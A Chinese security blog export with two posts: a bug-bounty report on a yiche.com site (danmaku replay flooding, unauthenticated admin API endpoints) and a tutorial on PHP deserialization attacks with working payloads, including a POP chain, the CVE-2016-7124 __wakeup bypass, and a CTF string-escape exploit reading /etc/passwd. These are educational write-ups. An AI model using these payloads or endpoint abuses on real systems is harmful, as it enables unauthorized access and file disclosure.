{"meta":{"title":"7_up Blog -读万卷书,行万里路","subtitle":"","description":"7_up Blog -致力于网络安全","author":"7_up","url":"http://77up.top","root":"/"},"pages":[{"title":"tags","date":"2022-01-14T09:26:50.000Z","updated":"2022-01-14T09:27:42.406Z","comments":true,"path":"tags/index.html","permalink":"http://77up.top/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-01-14T09:25:18.000Z","updated":"2022-01-14T09:28:08.455Z","comments":true,"path":"categories/index.html","permalink":"http://77up.top/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"补天易车src的一次挖掘","slug":"补天易车src的一次挖掘","date":"2022-01-14T09:53:41.000Z","updated":"2022-01-14T10:16:53.159Z","comments":true,"path":"2022/01/14/补天易车src的一次挖掘/","link":"","permalink":"http://77up.top/2022/01/14/%E8%A1%A5%E5%A4%A9%E6%98%93%E8%BD%A6src%E7%9A%84%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/","excerpt":"","text":"漏洞[1]在信息手机过程中遇到这么一个站https://xxx.yiche.com 打开之后是一个视频直播和录播的站点 这个逻辑漏洞挺简单的，就是炸房，后端没有限制弹幕的发送频率，只在前端进行验证，导致了发送弹幕包可以重放，对房间的弹幕进行轰炸随便找个直播间进去，之后点击弹幕的发送 在此处抓包，这个包 无payload爆破一下啊 造成炸房的效果，使主播不能跟观众互动或者其他，应该限制发送弹幕的频率 漏洞[2]:是一个越权漏洞，信息收集后打开目标站点：xxx.yiche.com 注册个账号后打开控制台 然后他说第一个登陆需要身份认证小tips：以后遇到app.xxx.js,xxx.map.js一定要看看有无敏感的api接口 使用linkfinder工具正则提取出来该js文件下的api接口 感觉像个开发中的系统，拼接appletList这个接口即可以管理员身份绕过身份认证来创建小程序 /appletManage 这个接口更x ,直接可以上下线，新建删除易车企业下的所有小程序 到此为止~by 7_up","categories":[{"name":"Src","slug":"Src","permalink":"http://77up.top/categories/Src/"},{"name":"web","slug":"web","permalink":"http://77up.top/categories/web/"}],"tags":[{"name":"Src","slug":"Src","permalink":"http://77up.top/tags/Src/"},{"name":"web","slug":"web","permalink":"http://77up.top/tags/web/"}]},{"title":"对于php反序列化的一些笔记","slug":"对于php反序列化的一些笔记","date":"2022-01-14T08:57:18.000Z","updated":"2022-01-14T09:54:48.063Z","comments":true,"path":"2022/01/14/对于php反序列化的一些笔记/","link":"","permalink":"http://77up.top/2022/01/14/%E5%AF%B9%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/","excerpt":"","text":"什么是PHP反序列化php序列化是指将php的对象（或者是普通的变量）转化为字符串的一个过程，目的是为了方便储存和传输数据。而反序列化就是将序列化后的字符串转化为对应的对象或普通变量的过程，下面我们来看一下php序列化和反序列化的函数 serialize()先看下php手册的说明 1serialize(mixed $value): string serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。 这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。 unserialize()1unserialize(string $str): mixed unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。 来个demo 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass demo&#123; public $s = &#x27;aaaaaa&#x27;; public $i = 11111; public $arr = array(&#x27;111&#x27;,&#x27;222&#x27;); protected $pro=&#x27;it\\&#x27;s protected&#x27;; private $pri = &#x27;it\\&#x27;s private&#x27;;&#125;$demo =new demo();$a =serialize($demo);echo $a;//输出结果如下，不可见字符用\\+十六进制表示//O:4:&quot;demo&quot;:5:&#123;s:1:&quot;s&quot;;s:6:&quot;aaaaaa&quot;;s:1:&quot;i&quot;;i:11111;s:3:&quot;arr&quot;;a:2:&#123;i:0;s:3:&quot;111&quot;;i:1;s:3:&quot;222&quot;;&#125;S:6:&quot;\\00*\\00pro&quot;;s:14:&quot;it&#x27;s protected&quot;;S:9:&quot;\\00demo\\00pri&quot;;s:12:&quot;it&#x27;s private&quot;;&#125;var_dump(unserialize($a));//输出结果如下：/*class demo#2 (5) &#123; public $s =&gt; string(6) &quot;aaaaaa&quot; public $i =&gt; int(11111) public $arr =&gt; array(2) &#123; [0] =&gt; string(3) &quot;111&quot; [1] =&gt; string(3) &quot;222&quot; &#125; protected $pro =&gt; string(14) &quot;it&#x27;s protected&quot; private $pri =&gt; string(12) &quot;it&#x27;s private&quot;&#125;*/ 序列化字符串格式php在序列化后用字母表示这个变量的类型，变量类型会写在php序列化字符串的每一个子字符串的开头 下面总结了一些常见的变量类型的字母表示 变量类型 序列化后字母表示 整型 i 双精度浮点 d 布尔 b NULL N 数组 a 字符串 s/S 类 O 说明下在字符串中：s是最普通的字符串，而S可以用反斜杠+16进制来表示字符 一个php变量在序列化之后一般有以下的格式，&lt;&gt;为可嵌套部分，可以是以下任意类型的变量序列化后的字符串 整型/double型/布尔型：i/d/b:[变量值]; 字符串类：s/S:[字符串长度]:&quot;[字符串值]&quot;; NULL类型：N; 数组：a:[数组元素个数]&#123;&lt;下标(整型)或数组的键(字符串)&gt;;&lt;数组的值&gt;;&lt;下标(整型)或数组的键(字符串)&gt;;&lt;数组的值&gt;;&#125; 对象：O:[类长度]:&quot;[类名]&quot;:[属性个数]&#123;s:[属性名1长度]:&quot;[属性名1]&quot;;&lt;属性值n&gt;;...;s:[属性名n长度]:&quot;[属性名n]&quot;;&lt;属性值n&gt;;&#125; 在表示修饰对象的属性访问控制修饰符时，会在属性名这里表示 比如在属性名前面加上\\00*\\00来表示该属性被protected属性修饰 在属性名前面加上\\00[类名]\\00来表示该属性被private属性修饰 PHP魔术方法在php的类中存在的魔术方法，在一定的条件下会被自动调用，魔术方法均为双下划线开头，下面给出一些魔术方法的简单描述 方法名 用途 __construct() 构造方法，在一个类在实例化时被调用 __destruct() 析构方法，在一个对象在被销毁的时候 被调用 __toString() 在一个对象在被当作字符串使用时调用的方法，返回值必须是字符串 __invoke() 在一个对象被作为函数使用时的方法 __call() 在一个对象被调用了一个不存在的方法时调用 __callStatic() 在静态的上下文中调用不存在的方法时使用 __sleep() 在一个对象在序列化时被调用的方法，返回值为包含属性名字的数组，如果没有加会抛一个E_NOTICE级别的错误 __wakeup() 在一个对象被反序列化的时候调用 __get() 在尝试读取不可访问或不存在的对象属性时被自动调用 __set() 在尝试给不可访问或不存在的对象属性赋值时会被自动调用 在这里说明几个函数： __toString()方法这个方法将在一个对象被当作字符串使用的时候会被调用，这包括很多情况，举几个例子： 使用echo，print输出声明了__toString方法的对象时或该对象参与格式化字符串输出时 用一个字符串和声明了__toString方法的对象进行拼接 用一个字符串和一个声明了__toString方法的对象进行比较 使用处理字符串的函数处理声明了__toString方法的对象，比如md5()，addslashes()，in_array()等 123456789101112131415161718192021&lt;?phpclass test1&#123; public $a=&#x27;this is a test&#x27;; public function __toString()&#123; echo &quot;called __toString&quot;.PHP_EOL; return $this-&gt;a; &#125;&#125;$t=new test1();echo &quot;printf:&quot;.PHP_EOL;printf(&quot;output: %s\\n&quot;,$t);echo &quot;addslashes:&quot;.PHP_EOL;addslashes($t);echo &quot;md5:&quot;.PHP_EOL;md5($t);echo &quot;==:&quot;.PHP_EOL;$t==&#x27;a&#x27;;echo &quot;in_array:&quot;.PHP_EOL;in_array($t,array(&quot;114514&quot;,&quot;neko&quot;,&quot;yukinoshita&quot;,&quot;this is a test&quot;,&quot;nacho nya&quot;)); 结果： 可以看见以上函数都被调用了，其中在in_array()函数中，被调用的次数和匹配到__toString()方法的返回值相同的位置相同 __call()方法和__callStatic()方法__call方法： 1public __call(string $name, array $arguments): mixed 在对象中调用一个不可访问方法时，__call()会被调用。 12345678&lt;?phpclass test1&#123; public function __call($name,$args)&#123; echo &quot;this is an unsupported method &quot;.$name; &#125;&#125;$a = new test1();$a-&gt;neko(); __callStatic()方法： 1public static __callStatic(string $name, array $arguments): mixed 在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用。 12345678&lt;?phpclass test1&#123; public static function __callStatic($name,$args)&#123; echo &quot;this is an unsupported method &quot;.$name; &#125;&#125;test1::neko(); 其中在这两个函数的定义中，$name是这调用方法的名字，$argument是传递给该函数参数的数组 对象注入在存在一个用户可控的unserialize()函数的参数时，我们可以构造特定的序列化字符串来达到创建任意类的目的，如果这个类有存在着__wakeup()，__destruct()等魔术方法且存在一些可以利用的函数，这里就可以利用这个类进行一波操作 举个例子： 12345678910111213&lt;?phphighlight_file(__FILE__);class logger&#123; public $filename=&#x27;log.txt&#x27;; public $content=&#x27;nothing to log&#x27;; public function __destruct()&#123; file_put_contents($this-&gt;filename,$this-&gt;content); &#125;&#125;if(isset($_GET[&#x27;obj&#x27;]))&#123; @unserialize($_GET[&#x27;obj&#x27;]);&#125; 我们只要构造合适的php序列化字符串传入，覆盖$filename和$content然后触发__destruct()方法就可以成功实现任意文件写入了 payload： 1234567891011&lt;?phpclass logger&#123; public $filename=&#x27;a.php&#x27;; public $content=&#x27;&lt;?php phpinfo();?&gt;&#x27;; public function __destruct()&#123; file_put_contents($this-&gt;filename,$this-&gt;content); &#125;&#125;$a=new logger();echo serialize($a);/*O:6:&quot;logger&quot;:2:&#123;s:8:&quot;filename&quot;;s:5:&quot;a.php&quot;;s:7:&quot;content&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;*/ 传入一下，成功 POP链POP：面向属性编程 是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。 一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。 来个例子 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phphighlight_file(__FILE__);class start_gg&#123; public $mod1; public $mod2; public function __destruct() &#123; $this-&gt;mod1-&gt;test1(); &#125;&#125;class Call&#123; public $mod1; public $mod2; public function test1() &#123; $this-&gt;mod1-&gt;test2(); &#125;&#125;class funct&#123; public $mod1; public $mod2; public function __call($test2,$arr) &#123; $s1 = $this-&gt;mod1; $s1(); &#125;&#125;class func&#123; public $mod1; public $mod2; public function __invoke() &#123; $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1; &#125; &#125;class string1&#123; public $str1; public $str2; public function __toString() &#123; $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; &#125;&#125;class GetFlag&#123; public function get_flag() &#123; echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;; &#125;&#125;$a = $_GET[&#x27;string&#x27;];unserialize($a);?&gt; 总结一下，pop链如下： 123456start_gg-&gt;__destruct();Call-&gt;test1();funct-&gt;__call();func-&gt;__invoke();string1-&gt;__toString();GetFlag-&gt;get_flag(); 这里我们看见我们想要执行的函数是是GetFlag-&gt;get_flag()，我们可以试着倒着推上去 此处POP想要执行GetFlag类的get_flag()方法，可以看见在string1类中的__toString()方法调用了$this-&gt;str1-&gt;get_flag()方法所以我们的$this-&gt;str1可以赋值为GetFlag类来使用这个同名函数 而想要调用到string1类的__toString()方法则需要找到一个成员变量被作为字符串调用的地方，于是我们可以看到func类的__invoke方法，$this-&gt;mod1变量被作为字符串拼接使用了， 而继续寻找可用的调用链我们可以找到funct类的__call方法和Call类的test1方法，而最终通过寻找同名函数的方式可以找到POP链的顶端是start_gg类的析构方法，可以通过对象注入自动调用 payload： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?phpclass start_gg&#123; public $mod1; public $mod2; public function __construct() &#123; $this-&gt;mod1=new Call(); &#125; &#125;class Call&#123; public $mod1; public $mod2; public function __construct() &#123; $this-&gt;mod1=new funct(); &#125; &#125;class funct&#123; public $mod1; public $mod2; public function __construct() &#123; $this-&gt;mod1=new func(); &#125; &#125;class func&#123; public $mod1; public $mod2; public function __construct() &#123; $this-&gt;mod1=new string1(); &#125; &#125;class string1&#123; public $str1; public $str2; public function __construct()&#123; $this-&gt;str1=new GetFlag(); &#125;&#125;class GetFlag&#123;&#125;$a = new start_gg();echo serialize($a);?&gt; PHP __wakeup魔术方法绕过CVE-2016-7124 可利用的版本： PHP5 &lt; 5.6.25PHP7 &lt; 7.0.10 内容：当php序列化字符串中对象成员个数大于真实的成员个数时会跳过wakeup方法的执行 例子： 123456789101112131415161718192021222324252627&lt;?php class SoFun&#123; protected $file=&#x27;wakeup.php&#x27;; function __destruct()&#123; if(!empty($this-&gt;file)) &#123; if(strchr($this-&gt; file,&quot;\\\\&quot;)===false &amp;&amp; strchr($this-&gt;file, &#x27;/&#x27;)===false) show_source(dirname (__FILE__).&#x27;/&#x27;.$this -&gt;file); else die(&#x27;Wrong filename.&#x27;); &#125; &#125; function __wakeup()&#123; $this-&gt; file=&#x27;index.php&#x27;; &#125; public function __toString() return &#x27;&#x27; ; &#125;&#125; if (!isset($_GET[&#x27;file&#x27;]))&#123; show_source(&#x27;wakeup.php&#x27;);&#125;else&#123; $file=base64_decode($_GET[&#x27;file&#x27;]); echo unserialize($file); &#125;?&gt; &lt;!--key in flag.php--&gt; payload: O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\\00*\\00file&quot;;s:8:&quot;flag.php&quot;;&#125; base64一下发过去就可以发现绕过了__wakeup()函数 反序列化字符逃逸如果在序列化的字符串中暴力地对反序列化字符串进行简单的字符替换处理，则可能会出现字符逃逸的情况，这个情况有点类似于SQL注入 我们来看一个例子 1234567891011121314&lt;?phpfunction filter($string)&#123; $filter = &#x27;/p/i&#x27;; return preg_replace($filter,&#x27;WW&#x27;,$string);&#125;$username = &#x27;purplet&#x27;;$age = &quot;10&quot;;$user = array($username, $age);var_dump(serialize($user));//string(37) &quot;a:2:&#123;i:0;s:7:&quot;purplet&quot;;i:1;s:2:&quot;10&quot;;&#125;&quot;echo &quot;&lt;pre&gt;&quot;;$r = filter(serialize($user));var_dump($r);//string(39) &quot;a:2:&#123;i:0;s:7:&quot;WWurWWlet&quot;;i:1;s:2:&quot;10&quot;;&#125;&quot;var_dump(unserialize($r));?&gt; 这个地方我们强行地把序列化后的字符串直接进行正则替换，将大小写的P替换成两个W，这导致了php在反序列化时读完前面对应的字符以后后面超过长度的部分被推出来了 这个地方我们可以尝试利用字符逃逸把数组里面的age从10替换成我们想要的值 如果我们把部分序列化的字符串放在$username的后面，我们如果想要把&quot;;i:1;s:4:&quot;neko&quot;;&#125;部分全部推出去的话，需要增加相同长度的字符，而&quot;;i:1;s:4:&quot;neko&quot;;&#125;的长度为18，则构造前面的字符串的长度为18 那么情况将会变成这样： 1234567891011121314&lt;?phpfunction filter($string)&#123; $filter = &#x27;/p/i&#x27;; return preg_replace($filter,&#x27;WW&#x27;,$string);&#125;$username = &#x27;purppppppppppppppppplet&quot;;i:1;s:4:&quot;neko&quot;;&#125;&#x27;;$age = &quot;10&quot;;$user = array($username, $age);var_dump(serialize($user));//string(72) &quot;a:2:&#123;i:0;s:41:&quot;purppppppppppppppppplet&quot;;i:1;s:4:&quot;neko&quot;;&#125;&quot;;i:1;s:2:&quot;10&quot;;&#125;&quot;echo &quot;&lt;pre&gt;&quot;;$r = filter(serialize($user));var_dump($r);//string(90) &quot;a:2:&#123;i:0;s:41:&quot;WWurWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWlet&quot;;i:1;s:4:&quot;neko&quot;;&#125;&quot;;i:1;s:2:&quot;10&quot;;&#125;&quot;var_dump(unserialize($r));?&gt; 最终php将a:2:&#123;i:0;s:41:&quot;WWurWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWlet&quot;;i:1;s:4:&quot;neko&quot;;&#125;作为正常的序列化字符串进行反序列化，而且后面被推出去的部分被php忽略了 123456array(2) &#123; [0]=&gt; string(41) &quot;WWurWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWlet&quot; [1]=&gt; string(4) &quot;neko&quot;&#125; 这样我们实现了把数组的后面的元素覆盖为我们想要的元素的目的 这种情况是字符增多的，下面我们来看一道CTF真题，是字符减少的情形 [安洵杯 2019]easy_serialize_php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 我们可以看见这题把序列化后的字符串直接传入了filter()方法，而filter方法中我们可以看见他直接使用了perg_replace方法把’php’,’flag’,’php5’,’php4’,’fl1g’字符串替换为空，而这里反序列化的变量是$_SESSION，我们可以直接通过这题存在的一个extract，参数是$_POST，进行变量覆盖，把$_session变量覆盖为我们想要的值，这样就可以实现参数可控了 这一题我们最终要实现的目的是利用最后的file_get_contents实现任意文件读取，这里我们就可以利用字符逃逸把前面固定赋值的img参数吃掉，然后插入我们想要的参数 payload如下： 1234#POST请求_SESSION[a]=phpphpphpphpphp&amp;_SESSION[b]=;s:1:&quot;x&quot;;s:1:&quot;x&quot;;s:3:&quot;img&quot;;s:16:&quot;L2V0Yy9wYXNzd2Q=&quot;;&#125;#GET请求?f=show_image 我们来看一下结果 直接序列化的输出是： a:3:&#123;s:1:&quot;a&quot;;s:15:&quot;phpphpphpphpphp&quot;;s:1:&quot;b&quot;;s:52:&quot;;s:1:&quot;x&quot;;s:1:&quot;x&quot;;s:3:&quot;img&quot;;s:16:&quot;L2V0Yy9wYXNzd2Q=&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; 经过字符串过滤以后： a:3:&#123;s:1:&quot;a&quot;;s:15:&quot;&quot;;s:1:&quot;b&quot;;s:52:&quot;;s:1:&quot;x&quot;;s:1:&quot;x&quot;;s:3:&quot;img&quot;;s:16:&quot;L2V0Yy9wYXNzd2Q=&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; 这个地方可以看见我在这里构造了5个php总共15个字符，刚好是后面&quot;;s:1:&quot;b&quot;;s:52:的长度 这样一来，原来标识字符串长度为52的那一部分就被吃掉了，而变成了字符串的一部分，而原来字符串的部分则被作为序列化的数据处理了 最终的结果是： 12345678array(3) &#123; [&quot;a&quot;]=&gt; string(15) &quot;\\&quot;;s:1:&quot;b&quot;;s:56:&quot; [&quot;x&quot;]=&gt; string(1) &quot;x&quot; [&quot;img&quot;]=&gt; string(20) &quot;L2QwZzNfZmxsbGxsbGFn&quot;&#125; 成功覆盖到img的值 PHP session 反序列化漏洞session是一种服务器标识用户的一种手段，php通过给用户分配session_id来表示每一个用户，同时也会在服务器上以文件的形式保存用户的session信息 需要使用session时我们需要使用$_SESSION全局变量，全局变量的内容会根据用户的session_id来命名一个文件，并保存在服务器上，文件名的格式为sess_用户的session_id 储存文件的位置可以在phpinfo的session.save_path里看到 php在session存储和读取时，或者是session在初始化的时候会有一个序列化和反序列化的过程，php内置了多种存储引擎用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化 以下展示三种不同的存储引擎的存储方式： 存储引擎名称 存储结构 php 键名|序列化以后的值 php_binary 键名的长度（对应的ascii字符）+键名+serialize()处理的数据 php_serialize serialize()以后的数据 这些储存引擎可以在php.ini来配置，配置的键名是session.serialize_handler 当在同时使用两种不同的引擎的时候，就有可能可以触发反序列化 写一个例子 12345678910111213141516171819&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;w4&#x27;] = $_GET[&#x27;a&#x27;];var_dump($_SESSION);?&gt;//2.php&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();var_dump($_SESSION);class test&#123; public $name; function __wakeup()&#123; echo $this-&gt;name; &#125;&#125;?&gt; 这里代码来自y4师傅的博客，我自己稍微修改了一下 可以看见这个地方传入一个a=w4rsp1t3 可以看到已经有session文件生成了，内容是：a:1:&#123;s:2:&quot;w4&quot;;s:8:&quot;w4rsp1t3&quot;;&#125; 如果访问2.php会发现session变量什么都没有，因为2.php的存储引擎和1.php的不相同，解析失败，而如果我们在1.php前面传入反序列化的payload，并且在前面加一个管道符，如下： |O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:8:&quot;w4rsp1t3&quot;;&#125; 传入以后session文件如下： a:1:&#123;s:2:&quot;w4&quot;;s:42:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:8:&quot;w4rsp1t3&quot;;&#125;&quot;;&#125; 这个时候访问2.php，在session_start()执行时，php引擎就会自动把后面那一串作为session的数据进行反序列化，这个时候就会触发代码的__wakeup()方法 phar触发的反序列化有些时候环境里面没有反序列化入口点，我们这里就可以寻找可以使用phar://协议的地方来配合文件上传等漏洞来进行反序列化","categories":[{"name":"php","slug":"php","permalink":"http://77up.top/categories/php/"},{"name":"ctf","slug":"ctf","permalink":"http://77up.top/categories/ctf/"}],"tags":[{"name":"php","slug":"php","permalink":"http://77up.top/tags/php/"},{"name":"ctf","slug":"ctf","permalink":"http://77up.top/tags/ctf/"}]}],"categories":[{"name":"Src","slug":"Src","permalink":"http://77up.top/categories/Src/"},{"name":"web","slug":"web","permalink":"http://77up.top/categories/web/"},{"name":"php","slug":"php","permalink":"http://77up.top/categories/php/"},{"name":"ctf","slug":"ctf","permalink":"http://77up.top/categories/ctf/"}],"tags":[{"name":"Src","slug":"Src","permalink":"http://77up.top/tags/Src/"},{"name":"web","slug":"web","permalink":"http://77up.top/tags/web/"},{"name":"php","slug":"php","permalink":"http://77up.top/tags/php/"},{"name":"ctf","slug":"ctf","permalink":"http://77up.top/tags/ctf/"}]}